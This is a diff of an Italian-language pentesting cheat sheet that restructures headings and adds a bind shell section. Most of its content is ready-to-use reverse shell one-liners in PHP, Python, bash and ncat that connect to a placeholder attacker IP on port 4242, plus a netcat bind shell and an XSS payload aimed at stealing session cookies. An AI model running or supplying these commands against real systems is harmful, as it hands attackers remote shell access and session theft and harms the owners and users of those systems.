@@ -35,28 +35,28 @@
 
 
 # SHELLS
-### REVERSE SHELL
-Nella reverse shell è l'attacker che si mette in listening e la vittima si collega, quindi
+## REVERSE SHELL
+Nella reverse shell è l'attacker che si mette in listening e la vittima si collega
 
-#### ATTACCANTE:
+### ATTACCANTE
 
 ```
 ncat -lvnp 4242
 ```
 
-#### VITTIMA:
+### VITTIMA
 
-##### php
+#### php
 ```
 php -r '$sock=fsockopen("IP_ATTACCANTE",4242);shell_exec("sh <&3 >&3 2>&3");'
 ```
 
-##### python3
+#### python3
 ```
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ATTACCANTE",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
 ```
 
-##### bash
+#### bash
 
 ```
 bash -i >& /dev/tcp/IP_ATTACCANTE/4242 0>&1
@@ -70,11 +70,24 @@ bash -i >& /dev/tcp/IP_ATTACCANTE/4242 0>&1
 /bin/bash -l > /dev/tcp/IP_ATTACCANTE/4242 0<&1 2>&1
 ```
 
-##### netcat
+#### netcat
 ```
 ncat 10.0.0.1 4242 -e /bin/bash
 ```
 
+## BIND SHELL
+Nella bind shell è la vittima che si mette in listening e l'attaccante si collega
+
+### VITTIMA
+
+```
+nc -lvnp 4242 -e /bin/bash
+```
+
+### ATTACCANTE
+```
+nc IP_VITTIMA 4242
+```
 
 # XSS
 ```<script>alert(document.cookie)</script>``` è quello che mediamente mi può interessare per idSession
